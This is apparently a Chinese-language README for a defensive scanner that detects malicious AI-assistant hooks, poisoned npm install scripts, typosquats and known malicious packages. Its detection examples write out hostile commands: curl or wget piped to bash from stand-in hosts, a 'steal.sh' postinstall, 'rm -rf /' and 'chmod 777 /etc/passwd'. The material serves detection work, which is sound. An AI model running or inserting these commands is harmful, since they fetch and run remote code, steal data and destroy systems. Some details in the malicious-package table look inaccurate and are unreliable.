# AI Security Scanner

> 🔒 AI 助手安全监控工具 - 检测恶意 hooks 和供应链投毒攻击

## 🎯 项目简介

AI Security Scanner 是一款面向 AI 编程助手时代的安全监控工具，专注于检测 Claude Code、Cursor 等 AI 编程助手带来的潜在安全风险，以及供应链投毒攻击。

### 🔥 为什么需要这个项目？

AI 编程助手带来了新的安全挑战：

1. **Hooks 自动执行风险**
   - Claude Code 的 `.claude/config.json` 支持 hooks 配置
   - 脚本可以在 `pre-commit`、`post-checkout` 等时机自动执行
   - 恶意 hooks 可能在你不注意时窃取数据或破坏代码

2. **供应链投毒攻击**
   - npm 包中的恶意脚本（如 `postinstall` 执行恶意代码）
   - 拼写错误攻击（如 `reqeusts` vs `requests`）
   - 伪装成正常包的恶意包（event-stream、colors 等）

3. **跨平台需求**
   - 开发者使用 Windows、macOS、Linux
   - 需要统一的解决方案

---

## ✨ 核心功能

### 1. Hooks 配置检测

检测以下配置文件中的恶意 hooks：

| AI 助手 | 配置文件 |
|---------|---------|
| Claude Code | `.claude/config.json` |
| Cursor | `.cursorrules` |
| 自定义 | `*.hook.json` |

**检测的恶意模式**：

```bash
# 远程代码执行
curl https://evil.com/script.sh | bash
wget https://malware.com/backdoor.sh | bash

# 破坏性命令
rm -rf /  # 删除系统文件
del /s /q # Windows 批量删除

# 权限提升
chmod 777 /etc/passwd
sudo rm -rf /
```

### 2. 供应链投毒检测

#### 恶意脚本检测

```json
// package.json 中的危险脚本
{
  "scripts": {
    "postinstall": "curl https://malware.com/steal.sh | bash",
    "preinstall": "wget http://evil.com/backdoor.py | python"
  }
}
```

#### 已知恶意包检测

| 包名 | 事件 | 危害 |
|------|------|------|
| event-stream | 2018 | 窃取比特币钱包私钥 |
| flatmap-stream | 2018 | 植入挖矿代码 |
| crossenv | 2021 | 窃取 AWS/数据库凭证 |
| ua-parser-js | 2021 | 窃取浏览器密码 |
| colors | 2022 | 破坏生产环境（打印乱码） |

#### 拼写错误攻击检测

```
reqeusts → requests  (伪装成 requests 包)
flaask   → flask    (伪装成 flask 包)
axiosx   → axios    (伪装成 axios 包)
```

### 3. 跨平台支持

| 平台 | 支持版本 |
|------|---------|
| Windows | PowerShell, Python |
| macOS | Bash/Zsh, Python, Node.js |
| Linux | Bash/Zsh, Python, Node.js |

---

## 🚀 快速开始

### 安装

```bash
# 克隆仓库
git clone https://github.com/lobsterai/ai-security-scanner.git
cd ai-security-scanner

# 安装依赖
pip install -r requirements.txt
```

### 基本使用

```bash
# 扫描当前目录
python ai-scanner.py

# 扫描指定目录
python ai-scanner.py -d /path/to/project

# 输出 JSON 报告
python ai-scanner.py -f json -o report.json

# 持续监控模式
python ai-scanner.py --watch --interval 60

# CI/CD 模式（发现问题返回错误码）
python ai-scanner.py --ci
```

### Shell 版本（macOS/Linux）

```bash
chmod +x ai-scanner.sh
./ai-scanner.sh -d /path/to/project
```

### Node.js 版本

```bash
node ai-scanner.js -d /path/to/project --ci
```

---

## 📊 使用场景

### 场景 1：新项目安全审计

```bash
# Clone 了不确定的第三方项目
git clone https://github.com/example/untrusted-repo.git
cd untrusted-repo

# 立即扫描
python ai-scanner.py --ci
```

**结果**：如果发现恶意 hooks 或供应链问题，脚本会报错并阻止继续使用。

### 场景 2：定时安全巡检

```bash
# 每天早上 9 点自动扫描
0 9 * * * python /path/to/ai-scanner.py -d ~/projects -o reports/daily.json
```

### 场景 3：Git Hooks 集成

```bash
# .git/hooks/pre-commit
#!/bin/bash
python /path/to/ai-scanner.py --ci
if [ $? -ne 0 ]; then
    echo "安全扫描失败，提交被阻止"
    exit 1
fi
```

### 场景 4：CI/CD 流水线

```yaml
# GitHub Actions
- name: Security Scan
  run: |
    pip install ai-security-scanner
    ai-scanner --ci
```

---

## 🔧 配置选项

创建 `config.yaml` 自定义扫描行为：

```yaml
# 扫描路径
scan_paths:
  - ~/projects
  - ~/work

# 排除目录
exclude_patterns:
  - "**/node_modules/**"
  - "**/dist/**"
  - "**/.git/**"

# 检测规则
rules:
  enabled:
    - HOOK-001  # curl | bash
    - HOOK-002  # wget | bash
    - HOOK-004  # rm -rf
    - SUPPLY-001 # 恶意 postinstall

# 通知设置
notifications:
  webhook:
    enabled: true
    url: https://hooks.slack.com/xxx
```

---

## 📁 输出示例

### 文本报告

```
============================================================
AI Security Scanner - Auto Detection Report
============================================================

[Projects Found]: 5
  - ~/projects/web-app (npm)
  - ~/projects/api-server (python)

[Dependency Issues]: 2
  [CRITICAL] 发现已知恶意包：event-stream v3.3.6
    File: ~/projects/crypto-app/node_modules/event-stream/package.json
    Risk: 窃取比特币钱包私钥
    Action: 立即删除并审计系统

[Summary]
  Projects scanned: 5
  Critical issues: 1
  Warning issues: 1

============================================================
【紧急处理指南】
============================================================
1. 立即停止使用受影响的系统
2. 不要运行 'npm install'
3. 检查并轮换所有凭证
4. 运行 'npm audit' 检查依赖
============================================================
```

### JSON 报告

```json
{
  "projects_found": 5,
  "security_issues": {
    "critical": 1,
    "warning": 1,
    "details": [
      {
        "type": "malicious_package",
        "severity": "CRITICAL",
        "package": "event-stream",
        "version": "3.3.6",
        "reason": "2018年通过 flatmap-stream 植入代码",
        "damage": "窃取比特币钱包私钥",
        "remediation": "立即删除并审计系统"
      }
    ]
  }
}
```

---

## 🆚 对比同类工具

| 功能 | AI Security Scanner | npm audit | Snyk |
|------|-------------------|-----------|------|
| AI hooks 检测 | ✅ | ❌ | ❌ |
| 跨平台 | ✅ Win/Mac/Linux | ✅ | ✅ |
| 拼写错误攻击 | ✅ | ❌ | ⚠️ 部分 |
| 已知恶意包库 | ✅ | ⚠️ 有限 | ✅ |
| 持续监控 | ✅ | ❌ | ✅ |
| CI/CD 集成 | ✅ | ✅ | ✅ |

---

## 🛡️ 安全建议

### 开发前

1. **不要信任 AI 生成的 hooks 配置**
2. **仔细审查 `.claude/config.json`**
3. **新项目先运行 `ai-scanner --ci`**

### 开发中

1. **启用持续监控模式**：`ai-scanner --watch`
2. **定期更新扫描规则**
3. **保持依赖更新**：`npm audit fix`

### 发现问题后

1. **立即停止使用**受影响的系统
2. **不要运行** `npm install` 或 `yarn install`
3. **检查并轮换**所有可能泄露的凭证
4. **审计 git 历史**确认何时引入问题包
5. **报告**给 npm 安全团队

---

## 🤝 贡献指南

欢迎提交 Issue 和 Pull Request！

### 提交新的恶意包

```python
# 在 auto_scanner.py 中添加
MALICIOUS_PACKAGES = {
    '<package-name>': {
        'type': 'supply_chain',
        'severity': 'CRITICAL',
        'reason': '事件描述',
        'damage': '危害',
        'remediation': '处理建议'
    }
}
```

### 运行测试

```bash
pytest tests/ -v
```

---

## 📄 许可证

MIT License - 详见 [LICENSE](LICENSE) 文件

---

## 🙏 致谢

- [OWASP Top 10](https://owasp.org/www-project-top-ten/) - 安全参考
- [npm Security](https://docs.npmjs.com/cli/v9/using-npm/security) - npm 安全最佳实践
- [Socket Security](https://socket.dev/) - 供应链安全研究

---

## 🔗 相关资源

- [GitHub Issues](https://github.com/lobsterai/ai-security-scanner/issues)
- [提交恶意包情报](https://github.com/lobsterai/ai-security-scanner/blob/main/CONTRIBUTING.md)
- [更新日志](https://github.com/lobsterai/ai-security-scanner/blob/main/CHANGELOG.md)

---

## 🌐 语言切换

- [English](PROJECT-INTRO.md) - English version
- [中文](PROJECT-INTRO_ZH.md) - 中文版本

---

**版本**: 1.2.0  
**更新日期**: 2026-04-02  
**作者**: JavaMaGong (AI Coding 辅助)  
**许可证**: MIT
